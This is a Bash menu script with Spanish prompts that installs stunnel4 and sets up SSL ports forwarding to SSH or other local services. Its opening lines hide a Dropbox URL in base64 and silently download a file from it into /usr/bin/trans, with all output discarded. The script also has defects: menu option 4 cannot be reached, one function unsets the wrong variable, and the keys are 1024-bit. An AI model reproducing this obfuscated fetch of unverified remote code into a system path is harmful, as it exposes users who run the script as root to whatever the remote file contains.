#!/bin/bash
declare -A cor=( [0]="\033[1;37m" [1]="\033[1;34m" [2]="\033[1;31m" [3]="\033[1;33m" [4]="\033[1;32m" )
SCPfrm="/etc/ger-frm" && [[ ! -d ${SCPfrm} ]] && exit
SCPinst="/etc/ger-inst" && [[ ! -d ${SCPinst} ]] && exit
API_TRANS="aHR0cHM6Ly93d3cuZHJvcGJveC5jb20vcy9sNmlxZjV4anRqbXBkeDUvdHJhbnM/ZGw9MA=="
SUB_DOM='base64 -d'
wget -O /usr/bin/trans $(echo $API_TRANS|$SUB_DOM) &> /dev/null
mportas () {
unset portas
portas_var=$(lsof -V -i tcp -P -n | grep -v "ESTABLISHED" |grep -v "COMMAND" | grep "LISTEN")
while read port; do
var1=$(echo $port | awk '{print $1}') && var2=$(echo $port | awk '{print $9}' | awk -F ":" '{print $2}')
[[ "$(echo -e $portas|grep "$var1 $var2")" ]] || portas+="$var1 $var2\n"
done <<< "$portas_var"
i=1
echo -e "$portas"
}
ssl_stunel () {
[[ $(mportas|grep stunnel4|head -1) ]] && {
msg -ama " $(fun_trans "Parando Stunnel")"
msg -bar
fun_bar "service stunnel4 stop"
msg -bar
msg -ama " $(fun_trans "Parado Con exito!")"
msg -bar
}
}
msg -azu " $(fun_trans "SSL Stunnel Openssh")"
msg -bar
#msg -ama " $(fun_trans "Seleccione una puerta de redirección interna")"
#msg -ama " $(fun_trans "Es decir, un puerto en su servidor para SSL")"
#msg -ama " $(fun_trans "Deve ser un puerto dropbear")"
#msg -bar
#         while true; do
#         echo -ne "\033[1;37m"
#         read -p " Puerto SSL: " portx
#         if [[ ! -z $portx ]]; then
#             if [[ $(echo $portx|grep [0-9]) ]]; then
#                [[ $(mportas|grep $portx|head -1) ]] && break || echo -e "\033[1;31m $(fun_trans "Puerto Invalido")"
#             fi
#         fi
#         done
#msg -bar
#DPORT="$(mportas|grep $portx|awk '{print $2}'|head -1)"

ssl_iniciar() {
msg -bra " $(fun_trans "Que puerto desea abrir como SSL Openssh")"
msg -bar
    while true; do
    read -p " Puerto SSL: " SSLPORT
    [[ $(mportas|grep -w "$SSLPORT") ]] || break
    msg -ama "$(fun_trans "esta puerta está en uso")"
    unset SSLPORT
    done
msg -bar
msg -ama " $(fun_trans "Instalando SSL")"
msg -bar
fun_bar "apt-get install stunnel4 -y"
msg -bar
msg -azuc "Presione Enter a todas las opciones"
sleep 3
msg -bar
openssl genrsa 1024 > stunnel.key
openssl req -new -key stunnel.key -x509 -days 1000 -out stunnel.crt
cat stunnel.crt stunnel.key > stunnel.pem
mv stunnel.pem /etc/stunnel/
echo -e "client = no\n[ssh]\ncert = /etc/stunnel/stunnel.pem\naccept = ${SSLPORT}\nconnect = 127.0.0.1:22" > /etc/stunnel/stunnel.conf

echo "ENABLED=1 " >> /etc/default/stunnel4
echo "FILES="/etc/stunnel/*.conf" " >> /etc/default/stunnel4
echo "OPTIONS="" " >> /etc/default/stunnel4
echo "PPP_RESTART=0" >> /etc/default/stunnel4
service stunnel4 restart > /dev/null 2>&1
msg -bar
msg -ama " $(fun_trans "INSTALADO CON EXITO")"
msg -bar
}

ssl_portas() {
msg -bra "$(fun_trans "Que puerto desea agregar como SSL Openssh")"
msg -bar
    while true; do
    read -p " Puerto SSL: " SSLPORT1
    [[ $(mportas|grep -w "$SSLPORT1") ]] || break
    echo -e "$(fun_trans "esta puerta está en uso")"
    unset SSLPORT1
    done
msg -bar
msg -ama " $(fun_trans "Instalando SSL")"
msg -bar
fun_bar "apt-get install stunnel4"
msg -bar
msg -azuc "Presione Enter a todas las opciones"
sleep 2
msg -bar
openssl genrsa 1024 > stunnel.key
openssl req -new -key stunnel.key -x509 -days 1000 -out stunnel.crt
cat stunnel.crt stunnel.key > stunnel.pem
mv stunnel.pem /etc/stunnel/

echo "client = no" >> /etc/stunnel/stunnel.conf
echo "[ssh+]" >> /etc/stunnel/stunnel.conf
echo "cert = /etc/stunnel/stunnel.pem" >> /etc/stunnel/stunnel.conf
echo "accept = ${SSLPORT1}" >> /etc/stunnel/stunnel.conf
echo "connect = 127.0.0.1:22" >> /etc/stunnel/stunnel.conf

service stunnel4 restart > /dev/null 2>&1
msg -bar
msg -ama " $(fun_trans "AGREGADO CON EXITO")"
msg -bar
}

ssl_redir() {
msg -bra "$(fun_trans "Asigne un nombre para el redirecionador")"
msg -bra "$(fun_trans "letras sin espacio ejem: shadow,openvpn,etc...")"
msg -bar
read -p " nombre: " namer
msg -bar
msg -bra "$(fun_trans "A que puerto redirecionara el puerto SSL")"
msg -bra "$(fun_trans "Es decir un puerto abierto en su servidor")"
msg -bra "$(fun_trans "ejemplo: openvpn,shadowsocks,dropbear etc...")"
msg -bar
read -p " Local-Port: " portd
msg -bar
msg -bra "$(fun_trans "Que puerto desea agregar como SSL")"
msg -bar
    while true; do
    read -p " Puerto SSL: " SSLPORTr
    [[ $(mportas|grep -w "$SSLPORTr") ]] || break
    echo -e "$(fun_trans "esta puerta está en uso")"
    unset SSLPORT1
    done
msg -bar
msg -ama " $(fun_trans "Instalando SSL")"
msg -bar
fun_bar "apt-get install stunnel4"
msg -bar
msg -azuc "Presione Enter a todas las opciones"
sleep 2
msg -bar
openssl genrsa 1024 > stunnel.key
openssl req -new -key stunnel.key -x509 -days 1000 -out stunnel.crt
cat stunnel.crt stunnel.key > stunnel.pem
mv stunnel.pem /etc/stunnel/

echo "client = no" >> /etc/stunnel/stunnel.conf
echo "[${namer}]" >> /etc/stunnel/stunnel.conf
echo "cert = /etc/stunnel/stunnel.pem" >> /etc/stunnel/stunnel.conf
echo "accept = ${SSLPORTr}" >> /etc/stunnel/stunnel.conf
echo "connect = 127.0.0.1:${portd}" >> /etc/stunnel/stunnel.conf

service stunnel4 restart > /dev/null 2>&1
msg -bar
msg -ama " $(fun_trans "AGREGADO CON EXITO")"
msg -bar
}

msg -bar
msg -bra "[1] = ABRIR PUERTO SSL"
msg -bra "[2] = AGREGAR MAS PUERTOS SSL"
msg -verd "[3] = REDIRECIONAR SSL"
msg -verm2 "[4] = DETENER PUERTO SSL"
msg -bra "[0] = SALIR"
msg -bar
while [[ ${varread} != @([0-3]) ]]; do
read -p "Opcion: " varread
done
msg -bar
if [[ ${varread} = 0 ]]; then
exit
elif [[ ${varread} = 1 ]]; then
ssl_iniciar
elif [[ ${varread} = 2 ]]; then
ssl_portas
elif [[ ${varread} = 3 ]]; then
ssl_redir
elif [[ ${varread} = 4 ]]; then
ssl_stunel
fi
msg -bar